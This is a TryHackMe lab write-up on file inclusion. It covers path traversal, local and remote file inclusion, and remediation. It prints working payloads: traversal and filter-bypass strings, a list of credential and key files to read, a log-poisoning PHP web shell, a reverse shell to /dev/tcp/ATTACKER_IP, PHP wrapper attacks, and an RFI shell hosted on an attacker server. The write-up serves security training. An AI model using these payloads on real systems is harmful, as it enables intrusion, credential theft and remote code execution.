# TryHackMe — File Inclusion

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-LFI%20%7C%20RFI%20%7C%20Path%20Traversal-red)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Room | File Inclusion |
| URL | tryhackme.com/room/fileinc |
| Path | Jr Penetration Tester → Web Application Vulnerabilities |
| Tasks | Task 1 — Task 8 (all, 100%) |

---

## Tasks Completed

| Task | Topic |
|------|-------|
| Task 1 | Introduction |
| Task 2 | Deploy the VM |
| Task 3 | Path Traversal |
| Task 4 | Local File Inclusion (LFI) |
| Task 5 | Local File Inclusion (LFI) Continued |
| Task 6 | Remote File Inclusion (RFI) |
| Task 7 | Challenge |
| Task 8 | Remediation |

---

## Task 3 — Path Traversal

Path traversal (also called directory traversal) exploits insufficient input validation on file path parameters, allowing navigation outside the intended directory.

### How it works

```php
// Vulnerable PHP code
$file = $_GET['file'];
include("/var/www/html/pages/" . $file);
```

```
Normal request:
GET /page?file=about.php
→ loads /var/www/html/pages/about.php ✓

Path traversal attack:
GET /page?file=../../../../etc/passwd
→ loads /etc/passwd — system file with usernames
```

### Common traversal sequences

```
../           standard traversal (Linux/Mac)
..\           Windows traversal
....//        bypass filters that strip ../
..%2F         URL encoded /
%2e%2e%2f     fully URL encoded ../
..%252f       double URL encoded (bypasses single decode filters)
```

### High-value Linux files to target

```
/etc/passwd           → usernames on the system
/etc/shadow           → password hashes (requires root)
/etc/hosts            → internal hostnames and IPs
/proc/version         → Linux kernel version
/proc/self/environ    → environment variables (may contain secrets)
/var/log/apache2/access.log  → web server logs (useful for log poisoning)
/home/USER/.ssh/id_rsa       → SSH private key if found
```

### Windows equivalents

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
```

---

## Task 4 — Local File Inclusion (LFI)

LFI is path traversal taken further — not just reading files, but **including and executing** them as part of the application.

### Basic LFI

```
GET /index.php?page=../../../../etc/passwd
```

### LFI to Remote Code Execution — Log Poisoning

If the application includes log files and logs are writable, inject PHP code into the log, then include the log file:

**Step 1: Poison the Apache access log**
```bash
# Send a request with PHP code in the User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.thm/
```

**Step 2: The log file now contains PHP code**
```
10.10.10.1 - - [19/Jun/2026] "GET / HTTP/1.1" 200 - "<?php system($_GET['cmd']); ?>"
```

**Step 3: Include the log file and pass a command**
```
GET /index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
→ Returns: www-data
```

**Step 4: Escalate to reverse shell**
```
GET /index.php?page=../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261'
```

### PHP Wrappers for LFI

PHP includes built-in wrappers that extend LFI capabilities:

```bash
# Read PHP source code (bypasses PHP execution — shows raw source)
GET /index.php?page=php://filter/convert.base64-encode/resource=index.php
# → Returns base64 of the PHP file source, not the rendered output

# Execute code directly (if allow_url_include = On)
GET /index.php?page=data://text/plain,<?php system('whoami'); ?>

# Read files with expect wrapper
GET /index.php?page=expect://whoami
```

---

## Task 6 — Remote File Inclusion (RFI)

RFI allows including files from external servers — allowing direct code execution if the server fetches and runs the attacker's script.

**Requires:** `allow_url_fopen = On` and `allow_url_include = On` in PHP config (less common in modern setups).

### Basic RFI

**Step 1: Host a malicious PHP file on attacker's server**
```php
<?php system($_GET['cmd']); ?>
```

```bash
# Serve it
python3 -m http.server 8000
```

**Step 2: Include it via the vulnerable parameter**
```
GET /index.php?page=http://ATTACKER_IP:8000/shell.php&cmd=whoami
→ Server fetches and executes the remote PHP file
→ Returns: www-data
```

### LFI vs RFI Comparison

| | LFI | RFI |
|--|-----|-----|
| Source of included file | Local server filesystem | Remote attacker server |
| Requires | Path traversal | `allow_url_include = On` |
| RCE possible? | Via log poisoning or PHP wrappers | Directly — include your shell |
| More common? | Yes | Less common (requires misconfiguration) |

---

## Task 8 — Remediation

| Fix | How it prevents the attack |
|-----|---------------------------|
| **Input validation** | Whitelist allowed filenames/paths — reject anything with `../`, `%2f`, etc. |
| **basename()** function | Strips directory components — only the filename is kept |
| **Disable PHP wrappers** | Set `allow_url_fopen = Off`, `allow_url_include = Off` |
| **Chroot / open_basedir** | Restricts PHP to a specific directory — traversal can't escape it |
| **Least privilege** | Web server process shouldn't have read access to `/etc/passwd` or `/etc/shadow` |

---

## Key Takeaways

- **Path traversal is the foundation** — LFI and RFI are exploitation extensions of the same input validation failure
- **Log poisoning turns LFI into RCE** — any log file the application can include is a potential execution vector
- **PHP wrappers expand LFI significantly** — `php://filter` is the most commonly used, allowing source code disclosure of any PHP file
- **RFI requires specific PHP configuration** — less common but devastatingly simple when present
- **`/etc/passwd` is the classic proof-of-concept** — demonstrating this read is the standard way to confirm an LFI vulnerability in a report

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
